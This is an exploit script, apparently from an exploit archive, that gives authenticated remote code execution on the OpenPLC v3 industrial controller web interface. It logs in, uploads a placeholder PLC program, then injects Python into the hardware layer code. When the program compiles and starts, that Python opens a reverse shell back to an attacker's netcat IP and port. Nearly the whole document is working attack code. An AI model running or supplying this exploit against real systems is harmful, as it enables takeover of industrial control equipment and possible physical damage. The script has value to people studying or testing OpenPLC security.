# Exploit Title: OpenPLC 3 - Remote Code Execution (Authenticated)
# Date: 22/04/2024
# Exploit Author: Fellipe Oliveira (Updated by a french CEA LETI team)
# Vendor Homepage: https://www.openplcproject.com/
# Software Link: https://github.com/thiagoralves/OpenPLC_v3
# Version: OpenPLC v3
# Tested on: Ubuntu 16.04,Debian 9,Debian 10 Buster

#/usr/bin/python3

import requests
import sys
import time
import re

if len(sys.argv) != 7:
    print("[!] Wrong number of parameters provided.")
    print("[!] Usage: python3 attack.py <PLC IP Address> <OpenPLC Port> <OpenPLC Username> <OpenPLC Password> <Netcat IP Address> <Netcat Port>")
    sys.exit(1)

openplc_url = "http://" + sys.argv[1] + ":" + sys.argv[2]
login_url = openplc_url + '/login' 
dashboard_url = openplc_url + '/dashboard'
programs_url = openplc_url + "/programs"
upload_program_url = openplc_url + "/upload-program" 
start_plc_program_url = openplc_url + '/start_plc'
stop_plc_program_url = openplc_url + '/stop_plc'
compile_program_url = openplc_url + '/compile-program?file=' 
compile_logs_url = openplc_url + '/compilation-logs'
hardware_driver_url = openplc_url + "/hardware"

openplc_username = sys.argv[3]
openplc_password = sys.argv[4]
rev_ip = sys.argv[5]
rev_port = sys.argv[6]

session = requests.Session()


def send_request(method, url, headers=None, cookies=None, data=None):
    max_retries = 5
    
    for attempt in range(1, max_retries + 1):
        try:

            if method.upper() == "POST":
                response = session.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
            elif method.upper() == "GET":
                response = session.get(url, timeout=5)
            else:
                print("[!] Unknown method. Please choose GET or POST.")
                return None

            if response.status_code == 200:
                time.sleep(2)
                return response
            else:
                print(f"[!] Received unexpected status code {response.status_code} from server.")

        except requests.exceptions.Timeout:
            print("[!] Request timed out. No response within 5 seconds.")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed due to an error: {e}")
        
        if attempt < max_retries:
            print(f"[!] Retrying in 2 seconds...")
            time.sleep(2)
        else:
            print("[!] Maximum number of attempts reached. Exiting.")
            print("[!] Resquest to OpenPLC may occasionally fail due to timeouts. This happens because OpenPLC occasionally does not respond to certain HTTP requests, especially when the target system or OpenPLC itself is busy. To reduce the likelihood of failure, close any open OpenPLC web interface tabs in your browser.")
            print("[!] If the problem persists, verify that your OpenPLC settings are correct. In the settings section, you should have only the Modbus server enabled, and all other interfaces disabled. After making changes, don't forget to scroll down the page and click on 'Save changes' at the bottom.")
            sys.exit(1)


def auth(openplc_url, username, password):
    print('[+] Remote Code Execution on OpenPLC_v3 WebServer')
    print('[+] Checking if host '+ openplc_url +' is up...')
    send_request("GET", login_url)
    print('[+] Host is up and reachable.')
    
    print('[+] Trying to authenticate with credentials '+ username +':'+ password +'...')   
    credentials = {
        'username': username,
        'password': password
    }

    login_response = send_request("POST", login_url, None, None, credentials)
    match = re.search(r"<div class='login-page'>", login_response.text)
    if (login_response.status_code == 200 and not match):
        print('[+] Login successful.')
        match = re.search(r"<b>File:</b>\s*([^<]+)", login_response.text)
        if match:
            current_program = match.group(1).strip()
            return current_program
        else:
            print("[!] No PLC program found.")
            uploaded_program = upload_plc_program()
            return uploaded_program

    else:
        print('[!] Login failed.')
        print("Please check your credentials and try again. If the credentials are correct, the issue could be that the target system's time is out of sync. This issue may occur if the target system was powered off or has incorrect time settings. To fix this, navigate to /embedded-device/scripts_config and run the 'update_timedate.sh' script to update the system time.")
        sys.exit(1) 
         

def upload_plc_program():
    print('[+] Uploading a PLC program...')
    send_request("GET", upload_program_url)

    cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvgPw.qwEcF3rMliGcTgQ4zI4RInBZrqE"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------210749863411176965311768214500", "Origin": openplc_url, "Connection": "close", "Referer": programs_url, "Upgrade-Insecure-Requests": "1"} 
    data = "-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name=\"file\"; filename=\"program.st\"\r\nContent-Type: application/vnd.sailingtracker.track\r\n\r\nPROGRAM prog0\n  VAR\n    var_in : BOOL;\n    var_out : BOOL;\n  END_VAR\n\n  var_out := var_in;\nEND_PROGRAM\n\n\nCONFIGURATION Config0\n\n  RESOURCE Res0 ON PLC\n    TASK Main(INTERVAL := T#50ms,PRIORITY := 0);\n    PROGRAM Inst0 WITH Main : prog0;\n  END_RESOURCE\nEND_CONFIGURATION\n\r\n-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload Program\r\n-----------------------------210749863411176965311768214500--\r\n"
    upload = send_request("POST", upload_program_url, headers, cookies, data)

    match = re.search(r'value=\'(.*?)\.st\'', upload.content.decode('utf-8'))
    st_file = match.group(1)+'.st'

    act_url = openplc_url + "/upload-program-action"
    act_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------374516738927889180582770224000", "Origin": openplc_url, "Connection": "close", "Referer": upload_program_url, "Upgrade-Insecure-Requests": "1"}
    act_data = "-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_name\"\r\n\r\nprogram.st\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_descr\"\r\n\r\n\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_file\"\r\n\r\n"+st_file+"\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"epoch_time\"\r\n\r\n1617682656\r\n-----------------------------374516738927889180582770224000--\r\n"
    send_request("POST", act_url, act_headers, None, act_data)

    return st_file


def connection(plc_program):
    print("[+] Stopping the current PLC program...")
    send_request("GET", stop_plc_program_url)

    print("[+] Injecting python script into the OpenPLC hardware PSM...")
    cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvyFA.2NQ7ZYcNZ74ci2miLkefHCai2Fk"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------289530314119386812901408558722", "Origin": openplc_url, "Connection": "close", "Referer": hardware_driver_url, "Upgrade-Insecure-Requests": "1"}
    data = "-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"hardware_layer\"\r\n\r\npsm_linux\r\n-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"custom_layer_code\"\r\n\r\n#                  - OpenPLC Python SubModule (PSM) -\r\n# \r\n# PSM is the bridge connecting OpenPLC core to Python programs. PSM allows\r\n# you to directly interface OpenPLC IO using Python and even write drivers \r\n# for expansion boards using just regular Python.\r\n#\r\n# PSM API is quite simple and just has a few functions. When writing your\r\n# own programs, avoid touching on the \"__main__\" function as this regulates\r\n# how PSM works on the PLC cycle. You can write your own hardware initialization\r\n# code on hardware_init(), and your IO handling code on update_inputs() and\r\n# update_outputs()\r\n#\r\n# To manipulate IOs, just use PSM calls psm.get_var([location name]) to read\r\n# an OpenPLC location and psm.set_var([location name], [value]) to write to\r\n# an OpenPLC location. For example:\r\n#     psm.get_var(\"QX0.0\")\r\n# will read the value of %QX0.0. Also:\r\n#     psm.set_var(\"IX0.0\", True)\r\n# will set %IX0.0 to true.\r\n#\r\n# Below you will find a simple example that uses PSM to switch OpenPLC's\r\n# first digital input (%IX0.0) every second. Also, if the first digital\r\n# output (%QX0.0) is true, PSM will display \"QX0.0 is true\" on OpenPLC's\r\n# dashboard. Feel free to reuse this skeleton to write whatever you want.\r\n\r\n#import all your libraries here\r\nimport time\r\n\r\nimport os, pty, socket\r\n\r\n#global variables\r\ncounter = 0\r\nvar_state = False\r\nHOST = \""+rev_ip+"\"\r\nPORT = "+rev_port+"\r\n\r\n\r\ndef update_inputs():\r\n    return 0\r\n\r\ndef update_outputs():\r\n	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n	s.connect((HOST, PORT))\r\n	os.dup2(s.fileno(),0)\r\n	os.dup2(s.fileno(),1)\r\n	os.dup2(s.fileno(),2)\r\n	pty.spawn(\"/bin/sh\")\r\n	time.sleep(5)\r\n		\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    update_outputs()\r\n    time.sleep(0.1) #You can adjust the psm cycle time here\r\n\r\n-----------------------------289530314119386812901408558722--"
    send_request("POST", hardware_driver_url, headers, cookies, data)

    print("[+] Compiling the PLC program, this may take a few minutes...")
    send_request("GET", compile_program_url + plc_program)
    while(not("Compilation finished successfully!" in send_request("GET", compile_logs_url).text)):
        time.sleep(2)

    print("[+] Compilation finished successfully")
    send_request("GET", dashboard_url)

    print("[+] Starting the PLC program...")
    send_request("GET", start_plc_program_url)
    print('[+] Reverse connection initiated.') 
 


plc_program = auth(openplc_url, openplc_username, openplc_password)
connection(plc_program)
            
